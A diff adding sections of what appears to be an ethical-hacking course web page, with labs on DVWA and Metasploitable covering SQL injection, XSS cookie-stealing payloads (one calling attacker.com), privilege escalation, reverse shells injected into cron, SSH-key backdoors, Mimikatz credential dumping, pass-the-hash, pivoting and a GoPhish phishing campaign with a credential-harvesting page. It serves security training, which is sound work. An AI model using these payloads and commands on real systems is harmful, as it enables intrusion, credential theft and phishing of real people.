+        <span class="oi-tag b-blue">Lab: Directory traversal, default creds</span>
+      </div>
+    </li>
+    <li class="owasp-item">
+      <div class="oi-rank">A08</div>
+      <div class="oi-body">
+        <div class="oi-name">Software & Data Integrity Failures</div>
+        <div class="oi-desc">Insecure deserialization, unsigned code updates, CI/CD pipeline with unverified dependencies. Allows remote code execution through deserializing attacker-controlled objects.</div>
+        <span class="oi-tag b-violet">CEH Theory — understand concept</span>
+      </div>
+    </li>
+  </ul>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">💉</span>
+      <span class="ph-t">Lab 7.1 — SQL Injection: Manual + Automated (sqlmap) on DVWA</span>
+      <span class="ph-tag pt-lab">SQLi Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <div class="note green"><span class="ni">💡</span><span>Start DVWA on your Docker lab. Set security level to LOW first. Navigate to SQL Injection section.</span></div>
+      <ol class="steps" style="margin-top:14px;">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Manual SQLi — Test for Injection Point</div>
+            <div class="code" data-label="dvwa input field">
+<span class="cm"># Test for SQLi by breaking the query</span>
+Input: <span class="hi">'</span>
+<span class="out"># Error: You have an error in your SQL syntax → INJECTABLE!</span>
+
+<span class="cm"># Test with always-true condition</span>
+Input: <span class="val">1' OR '1'='1</span>
+<span class="out"># Returns all users — confirms SQLi</span>
+
+<span class="cm"># UNION-based — find number of columns first</span>
+Input: <span class="val">1' ORDER BY 1--</span>   <span class="cm"># no error</span>
+Input: <span class="val">1' ORDER BY 2--</span>   <span class="cm"># no error</span>
+Input: <span class="val">1' ORDER BY 3--</span>   <span class="cm"># ERROR: 2 columns confirmed</span>
+
+<span class="cm"># Extract database version</span>
+Input: <span class="val">1' UNION SELECT NULL,version()--</span>
+<span class="cm"># Extract all table names</span>
+Input: <span class="val">1' UNION SELECT NULL,table_name FROM information_schema.tables--</span>
+<span class="cm"># Extract users from users table</span>
+Input: <span class="val">1' UNION SELECT user,password FROM users--</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Automated SQLi with sqlmap</div>
+            <div class="code" data-label="bash">
+<span class="cm"># First get the DVWA cookie from your browser</span>
+<span class="cm"># (Browser DevTools → Storage → Cookies → PHPSESSID + security=low)</span>
+
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"</span> \
+  <span class="flag">--cookie</span>=<span class="val">"PHPSESSID=XXXX;security=low"</span> \
+  <span class="flag">--dbs</span>  <span class="cm"># enumerate databases</span>
+
+<span class="cm"># Dump a specific database</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"</span> \
+  <span class="flag">--cookie</span>=<span class="val">"PHPSESSID=XXXX;security=low"</span> \
+  <span class="flag">-D</span> dvwa <span class="flag">--dump</span>
+
+<span class="cm"># Attempt OS shell via SQLi (if DB user has FILE privilege)</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--os-shell</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Burp Suite — Intercept and Modify HTTP Requests</div>
+            <div class="code" data-label="burp suite workflow">
+<span class="cm"># Setup: Configure browser proxy → 127.0.0.1:8080</span>
+<span class="cm"># Burp Suite: Proxy → Intercept → ON</span>
+
+<span class="cm"># When you submit the DVWA SQL injection form:</span>
+<span class="cm"># Burp catches the request — you can see and modify:</span>
+<span class="kw">GET</span> /dvwa/vulnerabilities/sqli/?id=<span class="hi">1</span>&Submit=Submit HTTP/1.1
+Host: 192.168.56.102
+Cookie: PHPSESSID=xxx; security=low
+
+<span class="cm"># Change id=1 to id=1' OR '1'='1 and forward</span>
+<span class="cm"># Use Repeater (CTRL+R) to replay modified requests</span>
+<span class="cm"># Use Intruder to fuzz parameters with payloads</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+
+  <div class="practical">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">📜</span>
+      <span class="ph-t">Lab 7.2 — XSS: Stored and Reflected on DVWA</span>
+      <span class="ph-tag pt-lab">XSS Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Reflected XSS — Input Gets Reflected Back Without Sanitization</div>
+            <div class="code" data-label="dvwa — xss reflected">
+<span class="cm"># Basic test — does the input get reflected?</span>
+Input: <span class="hi">&lt;script&gt;alert(1)&lt;/script&gt;</span>
+<span class="out"># Pop-up alert = reflected XSS confirmed</span>
+
+<span class="cm"># Cookie theft payload</span>
+Input: <span class="hi">&lt;script&gt;document.location='http://192.168.56.1:4444/steal?c='+document.cookie&lt;/script&gt;</span>
+<span class="cm"># Attacker runs listener: python3 -m http.server 4444</span>
+<span class="cm"># When victim loads the page, their cookie is sent to attacker</span>
+
+<span class="cm"># Bypass simple filters</span>
+Input: <span class="hi">&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</span>     <span class="cm"># case mixing</span>
+Input: <span class="hi">&lt;img src=x onerror=alert(1)&gt;</span>   <span class="cm"># event handler</span>
+Input: <span class="hi">&lt;svg onload=alert(1)&gt;</span>           <span class="cm"># SVG tag</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Stored XSS — Payload Saved in Database, Executes for All Visitors</div>
+            <div class="code" data-label="dvwa — xss stored">
+<span class="cm"># In the guestbook field, submit:</span>
+Name: <span class="val">Hacker</span>
+Message: <span class="hi">&lt;script&gt;alert('XSS stored!')&lt;/script&gt;</span>
+
+<span class="cm"># Now EVERY visitor to the guestbook page gets the alert</span>
+<span class="cm"># Real attack: replace alert with cookie stealer</span>
+Message: <span class="hi">&lt;script&gt;new Image().src='http://attacker.com/?c='+document.cookie&lt;/script&gt;</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+08 — Privilege Escalation
+══════════════════ -->
+<div class="section" id="s8">
+  <div class="sec-head">
+    <span class="sec-num">08</span>
+    <div class="sec-meta">
+      <div class="sec-title">Privilege Escalation</div>
+      <div class="sec-sub">Linux SUID/sudo abuse, Windows token impersonation, and service misconfigurations</div>
+    </div>
+    <span class="badge b-red">Post-Access</span>
+  </div>
+
+  <div class="theory">
+    <h4>Why Privilege Escalation Is Critical</h4>
+    <p>Initial access rarely gives you admin/root. <strong>Privilege escalation (privesc)</strong> takes you from a low-privileged account to SYSTEM/root. This is essential for: dumping password hashes, installing persistence mechanisms, accessing all files, and pivoting to other systems.</p>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">⬆️</span>
+      <span class="ph-t">Lab 8.1 — Linux Privilege Escalation Techniques</span>
+      <span class="ph-tag pt-lab">Linux PrivEsc</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Run LinPEAS — Automated Linux Privilege Escalation Scanner</div>
+            <div class="code" data-label="bash — target machine">
+<span class="cm"># Download LinPEAS to target (after initial access)</span>
+<span class="cmd">curl</span> <span class="flag">-L</span> https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | <span class="cmd">sh</span>
+<span class="cm"># Alternatively: wget from your attacker machine's HTTP server</span>
+
+<span class="cm"># LinPEAS highlights in RED: high probability privesc vectors</span>
+<span class="cm"># Key findings to look for:</span>
+<span class="cm"># - SUID binaries (especially non-standard ones)</span>
+<span class="cm"># - Writable /etc/passwd or /etc/sudoers</span>
+<span class="cm"># - Sudo rules without password (NOPASSWD)</span>
+<span class="cm"># - Cron jobs running as root with writable scripts</span>
+<span class="cm"># - Kernel version (old = possible kernel exploit)</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">SUID Binary Abuse — GTFOBins</div>
+            <div class="code" data-label="bash — target">
+<span class="cm"># Find all SUID binaries</span>
+<span class="cmd">find</span> / <span class="flag">-perm -4000 -type f</span> 2>/dev/null
+<span class="cm"># -perm -4000: has SUID bit set</span>
+<span class="cm"># SUID = runs as file OWNER (often root) regardless of who executes it</span>
+
+<span class="cm"># Example: nmap with SUID (old versions allow --interactive shell)</span>
+<span class="cmd">ls -la</span> /usr/bin/nmap
+<span class="out"># -rwsr-xr-x 1 root root ... /usr/bin/nmap  ← SUID set (s in owner perms)</span>
+<span class="cmd">nmap --interactive</span>
+<span class="out"># nmap></span>
+nmap> !sh  <span class="cm"># drop to shell as root!</span>
+
+<span class="cm"># Check GTFOBins (gtfobins.github.io) for every SUID binary found</span>
+<span class="cm"># Common exploitable SUIDs: vim, python, find, bash, cp, nano</span>
+<span class="cm"># Example: find with SUID</span>
+<span class="cmd">find</span> . <span class="flag">-exec</span> /bin/sh <span class="flag">-p</span> \; <span class="flag">-quit</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Sudo Misconfiguration</div>
+            <div class="code" data-label="bash — target">
+<span class="cm"># Check what the current user can sudo</span>
+<span class="cmd">sudo -l</span>
+<span class="out"># (root) NOPASSWD: /usr/bin/vim  ← can run vim as root without password!</span>
+
+<span class="cm"># Exploit: vim can spawn a shell</span>
+<span class="cmd">sudo vim -c</span> ':!/bin/bash'
+<span class="out"># root@target:~#  ← got root!</span>
+
+<span class="cm"># NOPASSWD with ALL: trivially sudo su</span>
+<span class="out"># (root) NOPASSWD: ALL</span>
+<span class="cmd">sudo su</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">4</span>
+          <div class="sc">
+            <div class="st">Cron Job Hijacking</div>
+            <div class="code" data-label="bash — target">
+<span class="cm"># View root's cron jobs</span>
+<span class="cmd">crontab -l</span>
+<span class="cmd">cat</span> /etc/crontab
+<span class="cmd">ls</span> /etc/cron.d/
+
+<span class="cm"># Example vulnerable cron: runs a script as root</span>
+<span class="out"># * * * * * root /opt/scripts/backup.sh</span>
+
+<span class="cm"># Check if the script is writable by us</span>
+<span class="cmd">ls -la</span> /opt/scripts/backup.sh
+<span class="out"># -rwxrwxrw-  ← world-writable!</span>
+
+<span class="cm"># Inject reverse shell into the script</span>
+<span class="cmd">echo</span> <span class="val">'bash -i >& /dev/tcp/192.168.56.1/4445 0>&1'</span> >> /opt/scripts/backup.sh
+<span class="cm"># Start listener on your Kali: nc -lvnp 4445</span>
+<span class="cm"># Within 1 minute: root shell received</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">5</span>
+          <div class="sc">
+            <div class="st">Windows Privilege Escalation — Token Impersonation (Juicy Potato)</div>
+            <div class="code" data-label="windows — meterpreter">
+<span class="cm"># Check current privileges in Meterpreter</span>
+meterpreter> <span class="cmd">getprivs</span>
+<span class="cm"># If SeImpersonatePrivilege is listed = potentially exploitable</span>
+
+<span class="cm"># Use Potato attacks (Juicy/Sweet/Rogue) for token impersonation</span>
+meterpreter> <span class="cmd">upload</span> JuicyPotato.exe C:\\Windows\\Temp\\
+meterpreter> <span class="cmd">shell</span>
+C:\> JuicyPotato.exe <span class="flag">-l</span> 1337 <span class="flag">-p</span> c:\windows\system32\cmd.exe <span class="flag">-a</span> "/c whoami" <span class="flag">-t</span> *
+
+<span class="cm"># WinPEAS.exe — Windows equivalent of LinPEAS</span>
+meterpreter> <span class="cmd">upload</span> winPEAS.exe C:\\Windows\\Temp\\
+meterpreter> <span class="cmd">shell</span>
+C:\Windows\Temp> winPEAS.exe
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+09 — Persistence
+══════════════════ -->
+<div class="section" id="s9">
+  <div class="sec-head">
+    <span class="sec-num">09</span>
+    <div class="sec-meta">
+      <div class="sec-title">Persistence & Backdoors</div>
+      <div class="sec-sub">Maintaining access through reboots — SSH keys, cron, registry, services</div>
+    </div>
+    <span class="badge b-violet">Post-Exploitation</span>
+  </div>
+
+  <div class="theory violet">
+    <h4>Why Persistence Matters in CEH</h4>
+    <p>After gaining access, real attackers establish <strong>persistence mechanisms</strong> to survive reboots and ensure re-entry even if the initial vulnerability is patched. Understanding persistence techniques is essential for both attackers (CEH) and defenders (detecting them in a SOC). MITRE ATT&CK TA0003 documents 19+ persistence techniques.</p>
+  </div>
+
+  <table class="dtable">
+    <thead><tr><th>Persistence Mechanism</th><th>OS</th><th>How It Works</th><th>MITRE ATT&CK</th><th>Detection</th></tr></thead>
+    <tbody>
+      <tr><td class="tk">SSH Authorized Keys</td><td>Linux</td><td>Add attacker's public key to ~/.ssh/authorized_keys. Allows keyless SSH login as that user.</td><td class="tb">T1098.004</td><td>Monitor ~/.ssh/authorized_keys changes via Wazuh FIM</td></tr>
+      <tr><td class="tk">Cron Job</td><td>Linux</td><td>Add entry to /etc/crontab or user crontab to run reverse shell on schedule.</td><td class="tb">T1053.003</td><td>Audit crontab changes, monitor /etc/cron.*</td></tr>
+      <tr><td class="tk">Systemd Service</td><td>Linux</td><td>Create a new systemd service that starts the backdoor on boot.</td><td class="tb">T1543.002</td><td>Monitor /etc/systemd/system/ for new .service files</td></tr>
+      <tr><td class="tk">Registry Run Keys</td><td>Windows</td><td>HKLM\Software\Microsoft\Windows\CurrentVersion\Run executes on every login.</td><td class="tb">T1547.001</td><td>Sysmon Event ID 13 (Registry value set)</td></tr>
+      <tr><td class="tk">Windows Service</td><td>Windows</td><td>Create a new service (sc create) that starts the backdoor automatically.</td><td class="tb">T1543.003</td><td>Windows Event ID 7045 (new service installed)</td></tr>
+      <tr><td class="tk">Scheduled Task</td><td>Windows</td><td>schtasks /create runs payload on schedule or at logon.</td><td class="tb">T1053.005</td><td>Windows Event ID 4698 (scheduled task created)</td></tr>
+      <tr><td class="tk">Web Shell</td><td>Linux/Win</td><td>Upload PHP/ASPX file to webroot. Access via browser to execute commands.</td><td class="tb">T1505.003</td><td>Monitor webroot for new .php/.aspx files</td></tr>
+    </tbody>
+  </table>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">🔐</span>
+      <span class="ph-t">Lab 9.1 — Establish Linux Persistence via SSH Key and Cron</span>
+      <span class="ph-tag pt-lab">Persistence Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <div class="note red"><span class="ni">⚠</span><span>Perform on Metasploitable2 VM only. These are destructive actions on the target system — document every change for your VAPT report and ensure cleanup.</span></div>
+      <ol class="steps" style="margin-top:14px;">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Add SSH Backdoor Key (from Meterpreter/root shell)</div>
+            <div class="code" data-label="kali — attacker machine">
+<span class="cm"># 1. Generate SSH key pair on Kali (attacker)</span>
+<span class="cmd">ssh-keygen</span> <span class="flag">-t ed25519 -C</span> <span class="val">"lab-test-key"</span> <span class="flag">-f</span> ~/.ssh/lab_backdoor
+<span class="cm"># View public key</span>
+<span class="cmd">cat</span> ~/.ssh/lab_backdoor.pub
+            </div>
+            <div class="code" data-label="target machine — root shell">
+<span class="cm"># 2. Add public key to root's authorized_keys on target</span>
+<span class="cmd">mkdir -p</span> /root/.ssh
+<span class="cmd">chmod</span> 700 /root/.ssh
+<span class="cmd">echo</span> <span class="val">"ssh-ed25519 AAAA... lab-test-key"</span> >> /root/.ssh/authorized_keys
+<span class="cmd">chmod</span> 600 /root/.ssh/authorized_keys
+
+<span class="cm"># 3. Verify from Kali — keyless root SSH</span>
+<span class="cmd">ssh</span> <span class="flag">-i</span> ~/.ssh/lab_backdoor root@192.168.56.101
+<span class="out"># Instant root login — no password!</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Cron-Based Reverse Shell (Runs Every Minute)</div>
+            <div class="code" data-label="target — root shell">
+<span class="cm"># Add cron reverse shell to root crontab</span>
+<span class="cmd">crontab -e</span>
+<span class="cm"># Add this line:</span>
+<span class="val">* * * * * bash -i >& /dev/tcp/192.168.56.1/4446 0>&1</span>
+
+<span class="cm"># Start listener on Kali</span>
+<span class="cmd">nc -lvnp</span> 4446
+<span class="cm"># Within 60 seconds: root reverse shell received</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">CLEANUP — Remove All Persistence After Lab</div>
+            <div class="code" data-label="cleanup — important!">
+<span class="cm"># Remove SSH key</span>
+<span class="cmd">rm</span> /root/.ssh/authorized_keys
+<span class="cm"># Remove cron entry</span>
+<span class="cmd">crontab -r</span>   <span class="cm"># removes ALL root cron (or edit to remove specific line)</span>
+<span class="cm"># In real engagements: document all changes, remove after testing, restore to original state</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+10 — Lateral Movement
+══════════════════ -->
+<div class="section" id="s10">
+  <div class="sec-head">
+    <span class="sec-num">10</span>
+    <div class="sec-meta">
+      <div class="sec-title">Lateral Movement</div>
+      <div class="sec-sub">Pass-the-Hash, Pass-the-Ticket, pivoting, and network spread techniques</div>
+    </div>
+    <span class="badge b-cyan">Network</span>
+  </div>
+
+  <div class="theory cyan">
+    <h4>Lateral Movement — Expanding Foothold</h4>
+    <p>After compromising one system, attackers move laterally through the network to reach higher-value targets — domain controllers, file servers, databases. <strong>Lateral movement uses legitimate protocols and credentials</strong> (SMB, RDP, WMI, SSH) making it hard to detect without behavioral analytics.</p>
+    <p>Two critical Windows credential attack techniques: <strong>Pass-the-Hash (PtH)</strong> — use a dumped NTLM hash directly without knowing the plaintext password. <strong>Pass-the-Ticket (PtT)</strong> — forge or steal Kerberos tickets (Golden/Silver Ticket attacks).</p>
+  </div>
+
+  <div class="chain">
+    <div class="chain-step hit">
+      <div class="cs-n">Step 1</div>
+      <div class="cs-t">Initial Access</div>
+      <div class="cs-d">Compromise workstation via phishing/exploit</div>
+    </div>
+    <div class="chain-step">
+      <div class="cs-n">Step 2</div>
+      <div class="cs-t">Credential Dump</div>
+      <div class="cs-d">Mimikatz / hashdump — extract NTLM hashes</div>
+    </div>
+    <div class="chain-step hit">
+      <div class="cs-n">Step 3</div>
+      <div class="cs-t">Pass the Hash</div>
+      <div class="cs-d">Use hash to authenticate to other SMB hosts</div>
+    </div>
+    <div class="chain-step">
+      <div class="cs-n">Step 4</div>
+      <div class="cs-t">Pivot</div>
+      <div class="cs-d">Route traffic through compromised host to reach internal segments</div>
+    </div>
+    <div class="chain-step hit">
+      <div class="cs-n">Step 5</div>
+      <div class="cs-t">Domain Control</div>
+      <div class="cs-d">Reach and compromise Domain Controller</div>
+    </div>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">🔄</span>
+      <span class="ph-t">Lab 10.1 — Credential Dumping and Pass-the-Hash</span>
+      <span class="ph-tag pt-lab">Lateral Movement</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Linux Credential Dump — /etc/shadow (from root shell)</div>
+            <div class="code" data-label="target root shell">
+<span class="cm"># Dump /etc/shadow — password hashes for all users</span>
+<span class="cmd">cat</span> /etc/shadow
+<span class="out"># root:$6$salt$hash:17000:0:99999:7:::</span>
+<span class="out"># msfadmin:$1$salt$hash:17000:0:99999:7:::</span>
+
+<span class="cm"># Via Meterpreter</span>
+meterpreter> <span class="cmd">run post/linux/gather/hashdump</span>
+
+<span class="cm"># In-memory credentials (if sshpass or similar)</span>
+<span class="cmd">strings</span> /proc/*/environ 2>/dev/null | <span class="cmd">grep</span> <span class="flag">-i</span> pass
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Windows Credential Dump with Mimikatz (Windows VM)</div>
+            <div class="code" data-label="windows — admin shell / meterpreter">
+<span class="cm"># Via Metasploit (requires SYSTEM)</span>
+meterpreter> <span class="cmd">load kiwi</span>       <span class="cm"># load mimikatz</span>
+meterpreter> <span class="cmd">creds_all</span>       <span class="cm"># dump all credentials</span>
+meterpreter> <span class="cmd">lsa_dump_sam</span>    <span class="cm"># local SAM database</span>
+
+<span class="cm"># Direct mimikatz usage</span>
+mimikatz# <span class="cmd">privilege::debug</span>
+mimikatz# <span class="cmd">sekurlsa::logonpasswords</span>    <span class="cm"># plaintext + hashes from LSASS</span>
+mimikatz# <span class="cmd">lsadump::sam</span>               <span class="cm"># local SAM hashes</span>
+mimikatz# <span class="cmd">sekurlsa::wdigest</span>           <span class="cm"># cleartext passwords (older Windows)</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Pass-the-Hash with CrackMapExec</div>
+            <div class="code" data-label="kali — attacker">
+<span class="cm"># Using NTLM hash to authenticate (no password needed)</span>
+<span class="cm"># Hash format: LM:NT or just the NT hash</span>
+<span class="cmd">crackmapexec</span> smb 192.168.56.0/24 \
+  <span class="flag">-u</span> Administrator \
+  <span class="flag">-H</span> <span class="val">aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c</span>
+<span class="cm"># Checks entire subnet — which hosts accept this hash?</span>
+<span class="out"># SMB  192.168.56.110  445  WIN2019  [+] VULNERABLE\Administrator (Pwn3d!)</span>
+
+<span class="cm"># Execute command via PtH</span>
+<span class="cmd">crackmapexec</span> smb 192.168.56.110 \
+  <span class="flag">-u</span> Administrator <span class="flag">-H</span> <span class="val">HASH</span> \
+  <span class="flag">-x</span> <span class="val">"whoami"</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">4</span>
+          <div class="sc">
+            <div class="st">Pivoting via Meterpreter (Access Internal Subnets)</div>
+            <div class="code" data-label="msfconsole">
+<span class="cm"># After compromising 192.168.56.101 (dual-homed host with 10.10.10.x NIC)</span>
+meterpreter> <span class="cmd">run post/multi/manage/autoroute</span>
+<span class="cm"># OR manually add route</span>
+msf6> <span class="cmd">route add</span> 10.10.10.0/24 <span class="val">SESSION_ID</span>
+
+<span class="cm"># Now scan the internal network through the pivot</span>
+msf6> <span class="cmd">use</span> auxiliary/scanner/portscan/tcp
+msf6> <span class="cmd">set RHOSTS</span> 10.10.10.0/24
+msf6> <span class="cmd">run</span>
+<span class="cm"># Traffic goes: Kali → compromised host → internal network</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+11 — Social Engineering
+══════════════════ -->
+<div class="section" id="s11">
+  <div class="sec-head">
+    <span class="sec-num">11</span>
+    <div class="sec-meta">
+      <div class="sec-title">Social Engineering</div>
+      <div class="sec-sub">Phishing, pretexting, GoPhish campaigns, and vishing techniques</div>
+    </div>
+    <span class="badge b-yellow">Human Attack</span>
+  </div>
+
+  <div class="theory yellow">
+    <h4>Social Engineering — The Human Vulnerability</h4>
+    <p>Technical controls can be near-perfect — but humans remain the most exploitable attack surface. <strong>Social engineering</strong> manipulates people into performing actions or revealing information that compromises security. Over <strong>90% of cyberattacks</strong> start with a phishing email. CEH dedicates an entire module to these techniques because they're the most effective initial access vector in real engagements.</p>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="ck y">Phishing</div>
+      <div class="cv">Mass email campaign impersonating trusted entity (bank, IT support, HR). Goal: credential harvest or malware delivery. Low specificity = lower success rate.</div>
+    </div>
+    <div class="card">
+      <div class="ck y">Spear Phishing</div>
+      <div class="cv">Highly targeted phishing using OSINT about the victim (name, role, manager, recent project). <strong>3× more effective</strong> than generic phishing. Used in APT initial access.</div>
+    </div>
+    <div class="card">
+      <div class="ck y">Whaling</div>
+      <div class="cv">Spear phishing targeting C-suite executives. High-value target; attack often involves fake board meeting notifications, regulatory notices, or merger/acquisition documents.</div>
+    </div>
+    <div class="card">
+      <div class="ck o">Vishing</div>
+      <div class="cv">Voice phishing — phone calls impersonating IT helpdesk, bank fraud team, or CERT-In. Goal: get victim to reveal password, install remote access tool, or transfer money (BEC).</div>
+    </div>
+    <div class="card">
+      <div class="ck o">Pretexting</div>
+      <div class="cv">Creating a fabricated scenario (pretext) to extract information. "Hi, I'm from IT security — I need your current password to migrate your account to our new system."</div>
+    </div>
+    <div class="card">
+      <div class="ck g">Baiting</div>
+      <div class="cv">Leaving a USB drive labeled "Salary_2024.xlsx" in a parking lot or office. 45–98% of found drives are plugged in (IBM study). Autoruns or HID attacks execute payload.</div>
+    </div>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">🎣</span>
+      <span class="ph-t">Lab 11.1 — Build and Run a GoPhish Phishing Simulation</span>
+      <span class="ph-tag pt-lab">GoPhish Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <div class="note green"><span class="ni">💡</span><span><strong>For real engagements:</strong> Always obtain written permission specifying which employees are in scope and what actions (credential harvest, malware delivery, callback) are authorized. This lab uses <code style="color:var(--cyan)">@example.com</code> test addresses — only your own email addresses.</span></div>
+      <ol class="steps" style="margin-top:14px;">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Install and Configure GoPhish</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Download GoPhish binary (Linux)</span>
+<span class="cmd">wget</span> https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
+<span class="cmd">unzip</span> gophish-v0.12.1-linux-64bit.zip
+<span class="cmd">chmod</span> +x gophish
+<span class="cmd">sudo ./gophish</span>
+
+<span class="cm"># Access admin UI at https://localhost:3333</span>
+<span class="cm"># Default creds: admin / [shown in terminal output]</span>
+<span class="out"># Please login with the username admin and the password: XXXXXXXX</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Create a Sending Profile (SMTP Server)</div>
+            <div class="code" data-label="gophish UI config">
+<span class="kw">Sending Profiles → New Profile</span>
+Name:      Lab Test SMTP
+From:      IT Support &lt;itsupport@yourlab.local&gt;
+Host:      localhost:25 (or use Mailtrap.io for safe testing)
+
+<span class="cm"># For real engagements: use a dedicated sending domain</span>
+<span class="cm"># that looks like client's domain (e.g., security-alert.companydomain.com)</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Create a Phishing Email Template</div>
+            <div class="code" data-label="email template">
+Subject: <span class="warn">ACTION REQUIRED: Your account will be suspended in 24 hours</span>
+
+Body HTML:
+<span class="hi">&lt;p&gt;Dear {{.FirstName}},&lt;/p&gt;</span>
+<span class="hi">&lt;p&gt;Our security team has detected unusual login activity on your account.</span>
+<span class="hi">Please verify your identity immediately to avoid suspension.&lt;/p&gt;</span>
+<span class="hi">&lt;p&gt;&lt;a href="{{.URL}}"&gt;Click here to verify your account&lt;/a&gt;&lt;/p&gt;</span>
+<span class="hi">&lt;p&gt;IT Security Team&lt;/p&gt;</span>
+
+<span class="cm"># {{.FirstName}}: personalized with target name (increases click rate)</span>
+<span class="cm"># {{.URL}}: replaced by GoPhish tracking URL (shows who clicked)</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">4</span>
+          <div class="sc">
+            <div class="st">Create a Fake Landing Page (Credential Harvester)</div>
+            <div class="code" data-label="gophish landing page">
+<span class="kw">Landing Pages → New Page</span>
+<span class="cm"># Import from URL: paste the real login page URL</span>
+<span class="cm"># GoPhish clones it. Add {{.Tracker}} before &lt;/body&gt;</span>
+<span class="cm"># Enable: Capture Submitted Data</span>
+<span class="cm"># Enable: Capture Passwords (for testing purposes)</span>
+<span class="cm"># Redirect To: https://real-company.com after capture</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">5</span>
+          <div class="sc">
+            <div class="st">Launch Campaign and Monitor Results</div>
+            <div class="code" data-label="gophish results analysis">
+<span class="cm"># Dashboard shows real-time metrics:</span>
+Emails Sent:        50
+Emails Opened:      32  (64%)  — tracking pixel loaded
+Links Clicked:      18  (36%)  — visited phishing page
+Credentials Entered: 8  (16%)  — submitted form
+Reported:           2   (4%)   — reported to security team
+
+<span class="cm"># These metrics go in your Social Engineering section of the VAPT report</span>
+<span class="cm"># Key finding: 64% open rate, 16% credential submission = HIGH risk</span>
+<span class="cm"># Recommendation: mandatory phishing awareness training (KnowBe4/Proofpoint)</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+12 — AV Evasion & Covering Tracks
+══════════════════ -->
+<div class="section" id="s12">
+  <div class="sec-head">
+    <span class="sec-num">12</span>
+    <div class="sec-meta">
+      <div class="sec-title">AV Evasion & Covering Tracks</div>
+      <div class="sec-sub">Payload encoding, obfuscation techniques, and log clearing</div>
+    </div>
+    <span class="badge b-violet">Evasion</span>
+  </div>
+
+  <div class="theory violet">
+    <h4>AV Evasion — Why It Matters for CEH</h4>
